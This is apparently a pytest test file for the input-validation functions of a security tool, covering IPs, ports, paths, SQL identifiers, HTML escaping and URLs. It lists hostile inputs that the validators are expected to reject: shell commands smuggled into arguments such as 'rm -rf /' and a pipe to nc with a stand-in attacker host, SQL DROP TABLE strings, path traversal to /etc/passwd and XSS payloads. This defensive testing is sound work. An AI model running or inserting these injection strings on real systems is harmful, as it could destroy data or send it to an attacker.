#!/usr/bin/env python3
"""
Tests for security validation and sanitization.
"""
import pytest
from pathlib import Path
from souleyez.security.validation import (
    ValidationError,
    validate_ip_address,
    validate_cidr,
    validate_hostname,
    validate_port,
    validate_port_list,
    validate_file_path,
    sanitize_command_arg,
    validate_nmap_args,
    validate_table_name,
    validate_column_name,
    validate_severity,
    escape_html,
    sanitize_for_json,
    validate_engagement_name,
    validate_plugin_name,
    validate_protocol,
    validate_target,
    validate_url,
)


# ===== IP VALIDATION TESTS =====


def test_valid_ipv4():
    """Test valid IPv4 address."""
    assert validate_ip_address("192.168.1.1") == "192.168.1.1"
    assert validate_ip_address("10.0.0.1") == "10.0.0.1"


def test_valid_ipv6():
    """Test valid IPv6 address."""
    result = validate_ip_address("2001:0db8:85a3:0000:0000:8a2e:0370:7334")
    assert "2001:db8" in result  # Normalized form


def test_invalid_ip():
    """Test invalid IP addresses."""
    with pytest.raises(ValidationError):
        validate_ip_address("999.999.999.999")

    with pytest.raises(ValidationError):
        validate_ip_address("not an ip")

    with pytest.raises(ValidationError):
        validate_ip_address("192.168.1")


def test_valid_cidr():
    """Test valid CIDR notation."""
    assert validate_cidr("192.168.1.0/24") == "192.168.1.0/24"
    assert validate_cidr("10.0.0.0/8") == "10.0.0.0/8"


def test_invalid_cidr():
    """Test invalid CIDR notation."""
    with pytest.raises(ValidationError):
        validate_cidr("192.168.1.0/99")

    with pytest.raises(ValidationError):
        validate_cidr("not a cidr")


def test_valid_hostname():
    """Test valid hostnames."""
    assert validate_hostname("example.com") == "example.com"
    assert validate_hostname("sub.example.com") == "sub.example.com"
    assert validate_hostname("localhost") == "localhost"


def test_invalid_hostname():
    """Test invalid hostnames."""
    with pytest.raises(ValidationError):
        validate_hostname("-invalid.com")

    with pytest.raises(ValidationError):
        validate_hostname("invalid-.com")

    with pytest.raises(ValidationError):
        validate_hostname("a" * 300)  # Too long


# ===== PORT VALIDATION TESTS =====


def test_valid_port():
    """Test valid ports."""
    assert validate_port(80) == 80
    assert validate_port("443") == 443
    assert validate_port(65535) == 65535


def test_invalid_port():
    """Test invalid ports."""
    with pytest.raises(ValidationError):
        validate_port(0)

    with pytest.raises(ValidationError):
        validate_port(70000)

    with pytest.raises(ValidationError):
        validate_port("not a port")


def test_valid_port_list():
    """Test valid port lists."""
    assert validate_port_list("80,443") == "80,443"
    assert validate_port_list("1-1000") == "1-1000"
    assert validate_port_list("80,443,8000-9000") == "80,443,8000-9000"


def test_invalid_port_list():
    """Test invalid port lists."""
    with pytest.raises(ValidationError):
        validate_port_list("80;443")  # Wrong separator

    with pytest.raises(ValidationError):
        validate_port_list("80,70000")  # Port out of range

    with pytest.raises(ValidationError):
        validate_port_list("5000-1000")  # Backwards range


# ===== PATH VALIDATION TESTS =====


def test_valid_file_path(tmp_path):
    """Test valid file paths."""
    souleyez_dir = tmp_path / ".souleyez"
    souleyez_dir.mkdir()

    test_file = souleyez_dir / "test.db"
    test_file.touch()

    result = validate_file_path(test_file, must_exist=True, allowed_dirs=[tmp_path])
    assert result.exists()


def test_path_traversal_blocked(tmp_path):
    """Test that path traversal is blocked."""
    souleyez_dir = tmp_path / ".souleyez"
    souleyez_dir.mkdir()

    # Try to access parent directory
    with pytest.raises(ValidationError):
        validate_file_path("/etc/passwd", allowed_dirs=[souleyez_dir])

    # Try to use .. to escape
    with pytest.raises(ValidationError):
        validate_file_path(
            souleyez_dir / "../../../etc/passwd", allowed_dirs=[souleyez_dir]
        )


# ===== COMMAND INJECTION TESTS =====


def test_sanitize_command_arg():
    """Test command argument sanitization."""
    # Safe string should be quoted
    result = sanitize_command_arg("safe-arg")
    assert "safe-arg" in result

    # Dangerous characters should be quoted by shlex
    result = sanitize_command_arg("arg; rm -rf /")
    # shlex.quote wraps the whole string in single quotes
    assert result.startswith("'") and result.endswith("'")


def test_valid_nmap_args():
    """Test valid nmap arguments."""
    args = ["-sV", "-p", "80,443", "--script=http-title"]
    result = validate_nmap_args(args)
    assert result == args


def test_blocked_nmap_args():
    """Test dangerous nmap arguments are blocked."""
    # Command injection attempts
    with pytest.raises(ValidationError):
        validate_nmap_args(["--script=test && rm -rf /"])

    with pytest.raises(ValidationError):
        validate_nmap_args(["--script=test; whoami"])

    with pytest.raises(ValidationError):
        validate_nmap_args(["--script=test | nc attacker.com"])

    # Blocked arguments
    with pytest.raises(ValidationError):
        validate_nmap_args(["--interactive"])


# ===== SQL INJECTION TESTS =====


def test_valid_table_name():
    """Test valid table names."""
    assert validate_table_name("hosts") == "hosts"
    assert validate_table_name("_temp_table") == "_temp_table"
    assert validate_table_name("table123") == "table123"


def test_invalid_table_name():
    """Test invalid table names."""
    with pytest.raises(ValidationError):
        validate_table_name("table; DROP TABLE users")

    with pytest.raises(ValidationError):
        validate_table_name("table--comment")

    with pytest.raises(ValidationError):
        validate_table_name("123table")  # Can't start with number


def test_valid_column_name():
    """Test valid column names."""
    assert validate_column_name("id") == "id"
    assert validate_column_name("ip_address") == "ip_address"


def test_invalid_column_name():
    """Test invalid column names."""
    with pytest.raises(ValidationError):
        validate_column_name("col; DROP")

    with pytest.raises(ValidationError):
        validate_column_name("col--")


def test_valid_severity():
    """Test valid severity levels."""
    assert validate_severity("critical") == "critical"
    assert validate_severity("HIGH") == "high"  # Case insensitive
    assert validate_severity("MeDiUm") == "medium"


def test_invalid_severity():
    """Test invalid severity levels."""
    with pytest.raises(ValidationError):
        validate_severity("extreme")

    with pytest.raises(ValidationError):
        validate_severity("critical; DROP")


# ===== HTML/XSS TESTS =====


def test_escape_html():
    """Test HTML escaping."""
    # Basic escaping
    assert (
        escape_html("<script>alert('xss')</script>")
        == "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;&#x2F;script&gt;"
    )

    # Special characters
    assert escape_html("Rock & Roll") == "Rock &amp; Roll"
    assert escape_html('Say "hello"') == "Say &quot;hello&quot;"

    # None handling
    assert escape_html(None) == ""


def test_sanitize_for_json():
    """Test JSON sanitization."""
    # Control characters removed
    text = "Hello\x00\x01\x02World"
    result = sanitize_for_json(text)
    assert "\x00" not in result
    assert "HelloWorld" in result

    # None handling
    assert sanitize_for_json(None) == ""


# ===== ENGAGEMENT NAME TESTS =====


def test_valid_engagement_name():
    """Test valid engagement names."""
    assert (
        validate_engagement_name("Client Assessment 2025") == "Client Assessment 2025"
    )
    assert validate_engagement_name("  test  ") == "test"  # Trimmed


def test_invalid_engagement_name():
    """Test invalid engagement names."""
    with pytest.raises(ValidationError):
        validate_engagement_name("")

    with pytest.raises(ValidationError):
        validate_engagement_name("a" * 300)  # Too long

    with pytest.raises(ValidationError):
        validate_engagement_name("../../etc/passwd")  # Path traversal


# ===== PLUGIN NAME TESTS =====


def test_valid_plugin_name():
    """Test valid plugin names."""
    assert validate_plugin_name("nmap") == "nmap"
    assert validate_plugin_name("enum4linux") == "enum4linux"


def test_invalid_plugin_name():
    """Test invalid plugin names."""
    with pytest.raises(ValidationError):
        validate_plugin_name("Nmap")  # Must be lowercase

    with pytest.raises(ValidationError):
        validate_plugin_name("plugin-name")  # No hyphens

    with pytest.raises(ValidationError):
        validate_plugin_name("plugin; rm -rf")


# ===== PROTOCOL TESTS =====


def test_valid_protocol():
    """Test valid protocols."""
    assert validate_protocol("tcp") == "tcp"
    assert validate_protocol("TCP") == "tcp"  # Case insensitive
    assert validate_protocol("udp") == "udp"


def test_invalid_protocol():
    """Test invalid protocols."""
    with pytest.raises(ValidationError):
        validate_protocol("invalid")

    with pytest.raises(ValidationError):
        validate_protocol("tcp; DROP")


# ===== TARGET VALIDATION TESTS =====


def test_validate_target_with_ip():
    """Test validate_target accepts valid IP."""
    assert validate_target("192.168.1.1") == "192.168.1.1"


def test_validate_target_with_cidr():
    """Test validate_target accepts valid CIDR."""
    assert validate_target("10.0.0.0/24") == "10.0.0.0/24"


def test_validate_target_with_hostname():
    """Test validate_target accepts valid hostname."""
    assert validate_target("example.com") == "example.com"


def test_validate_target_invalid():
    """Test validate_target rejects invalid inputs."""
    with pytest.raises(ValidationError):
        validate_target("invalid@#$%")

    with pytest.raises(ValidationError):
        validate_target("")

    with pytest.raises(ValidationError):
        validate_target("   ")


# ===== URL VALIDATION TESTS =====


def test_validate_url_http():
    """Test valid HTTP URLs."""
    assert validate_url("http://example.com") == "http://example.com"
    assert validate_url("http://example.com/path") == "http://example.com/path"
    assert validate_url("http://192.168.1.1") == "http://192.168.1.1"


def test_validate_url_https():
    """Test valid HTTPS URLs."""
    assert validate_url("https://example.com") == "https://example.com"
    assert (
        validate_url("https://example.com:8443/path?q=1")
        == "https://example.com:8443/path?q=1"
    )


def test_validate_url_invalid():
    """Test invalid URLs."""
    with pytest.raises(ValidationError):
        validate_url("not a url")

    with pytest.raises(ValidationError):
        validate_url("")

    with pytest.raises(ValidationError):
        validate_url("ftp://example.com")  # FTP not allowed

    with pytest.raises(ValidationError):
        validate_url("file:///etc/passwd")  # File protocol blocked

    with pytest.raises(ValidationError):
        validate_url("javascript:alert(1)")  # JavaScript blocked
